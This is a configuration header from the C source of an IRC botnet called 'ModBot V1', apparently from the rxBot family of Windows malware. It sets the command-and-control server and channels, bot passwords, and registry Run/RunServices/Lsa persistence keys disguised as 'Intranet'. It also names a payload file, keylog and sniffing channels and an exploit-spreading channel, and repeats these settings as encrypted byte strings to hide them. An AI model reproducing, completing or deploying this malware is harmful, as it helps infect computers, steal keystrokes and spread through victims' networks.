// -------------------
//| Stipped ModBot V1 |
//|      by iNs       |
//|    uNkn0wn.eu     |
// -------------------

// NICK SETTINGS

BOOL nickprefix = TRUE;
BOOL topiccmd = TRUE;
BOOL rndfilename = FALSE;
BOOL AutoStart = TRUE;
int nicktype = FUNKYNICK;
int port = 6667;
int port2 = 6667;
int maxrand = 4;
int tftpport = 69;
unsigned short bindport = 3169;	
char prefix = '.';


#ifdef NO_CRYPT

// General Settings

char nickconst[] = "A-";
char password[] = "wannabe";  //wannaphunk
char botid[] = "v0.2";
char version[] = "120-ModBot V1 Stripped Mod by iNs";
char modeonconn[] = "-i";
char chanmode[] = "+mnstu";
char *authost[] = {
	"*@wannabe.com"  //*@wannabe.com
};
char *versionlist[] = {
	"eggdrop v1.6.10"
};

// FiLE NaMe SeTtInGs

char filename[] = "testbot2.exe"; //testbot.exe
char szLocalPayloadFile[]="winpay.dat";
char logfile[]="winlogers.txt";

// ReG SeTtInGs

char valuename[] = "Intranet";  //Intranet
char regkey1[]="Software\\Microsoft\\Windows\\CurrentVersion\\Run";
char regkey2[]="Software\\Microsoft\\Windows\\CurrentVersion\\RunServices";
char regkey3[]="Software\\Microsoft\\OLE";
char regkey4[]="SYSTEM\\CurrentControlSet\\Control\\Lsa";

// SeRvEr SeTtInGs

char server[] = "irc.server.com"; // 127.0.0.1
char serverpass[] = "";
char server2[] = "";

// ChAnNeL SeTtInGs

char channel[] = "#test1"; //#test1
char chanpass[] = "test02";
char channel2[] = "";
char chanpass2[] = "";
char exploitchan[] = "#xpl";
char patchchan[] = "#xpl";
#endif

char mn_title[]		= "-=MAIN=-";
char sc_title[]		= "-=SCAN=-";
char rt_title[]		= "-=ROOT=-";


/// Config for Crypted info ///

/*
#ifndef NO_CRYPT

// BoT CoNfIgUrAtIoN

char nickconst[] = "\x7F\x54\xB9\x79\x56";
char password[] = "\x53\x4D\x94\x4A\x1A\x92\xBF\x24\xF3\x67";  //wannaphunk
char botid[] = "\x57\x59\x99\x4F\x08\x97\xB4\x3A\xEE\x79\x1D\xC1";
char version[] = "\x77\x47\x95\x4A\x10\xCF\x8C\x1C\xF2\x68\x3C\xC5\x5A\x59\x82\x9B\xD2\x8E\x6A\xCB\x80\x88\xBC\x69\xF9";
char modeonconn[] = "\x0F\x54";
char chanmode[] = "\x0F\x5F\x97\x4A\x0F\x92";

char *authost[] = {
	"\x0E\x6C\x8D\x45\x15\x8C\xB6\x33\xF8\x22\x1D\xC5\x43"  //*@wannabe.com
};

char *versionlist[] = {
	"\x6D\x41\x9F\x04\x3A\xC2\x91\x24\xFE\x67\x5E\xFF\x0E\x46\xC0\xBC\x92\xAE\x68\xC3\x8D\x97\xE1\x22\xED\x1D\xBE\x83\x9D\x31\x45\xF3\xD6\x99\xC1\xBF\x98\xB8\xA6\xF6\x25\xB9"
};

// FiLE NaMe SeTtInGs

char filename[] = "\x50\x49\x89\x50\x19\x8D\xA3\x7F\xF8\x74\x1B"; //testbot.exe
char szLocalPayloadFile[]="\x57\x55\x89\x47\x14\x8C\xB1\x38\xFA\x22\x1A\xCB\x5A";
char logfile[]="\x47\x16\xA6\x78\x08\x9B\xA4\x25\xF8\x61\x50\xCE\x4F\x70";

// ReG SeTtInGs

char valuename[] = "\x6D\x42\x8E\x56\x1A\x8C\xB2\x25";  //Intranet
char regkey1[]="\x77\x43\x9C\x50\x0C\x83\xA5\x34\xC1\x50\x33\xC3\x4D\x76\xC0\xBB\xD0\x89\x72\xFB\xF1\x89\xE5\x29\xA9\x3A\xAC\x82\xA4\x4D\x52\xE9\x84\xAD\xD1\xB2\x87\xCE\x96\xA4\x03\xA0\xA1\x5F\x68\x94\x38\xF3\x93";
char regkey2[]="\x77\x43\x9C\x50\x0C\x83\xA5\x34\xC1\x50\x33\xC3\x4D\x76\xC0\xBB\xD0\x89\x72\xFB\xF1\x89\xE5\x29\xA9\x3A\xAC\x82\xA4\x4D\x52\xE9\x84\xAD\xD1\xB2\x87\xCE\x96\xA4\x03\xA0\xA1\x5F\x68\x94\x38\xF3\x93\xA8\x34\xC2\x71\xDD\xFE\x98\xC9";
char regkey3[]="\x77\x43\x9C\x50\x0C\x83\xA5\x34\xC1\x50\x33\xC3\x4D\x76\xC0\xBB\xD0\x89\x72\xFB\xF1\x91\xC0\x02";
char regkey4[]="\x77\x43\x9C\x50\x0C\x83\xA5\x34\xC1\x50\x3F\xF9\x7E\x76\xC0\xBC\xDA\x8C\x72";

// SeRvEr SeTtInGs

char server[] = "\x4D\x5E\x99\x0A\x1D\x90\xB2\x22\xF5\x65\x0C\xC9"; // 127.0.0.1
char serverpass[] = "";
char server2[] = "";

// ChAnNeL SeTtInGs

char channel[] = "\x07\x58\x9F\x57\x0F\xD3"; //#test1
char chanpass[] = "\x4E\x59\x94\x43\x17\x8B\xA4\x25";
char channel2[] = "";
char chanpass2[] = "";
char exploitchan[] = "\x07\x58\x9F\x57\x0F\xD3";
char patchchan[] = "\x07\x58\x9F\x57\x0F\xD3";
char sniffchan[] = "\x07\x5F\x94\x4D\x1D\x84";
char keylogchan[] = "\x07\x5F\x94\x4D\x1D\x84";
char keylogfile[] = "\x17\x1E\x88\x48\x55\x8A\xBE\x35";
#endif
*/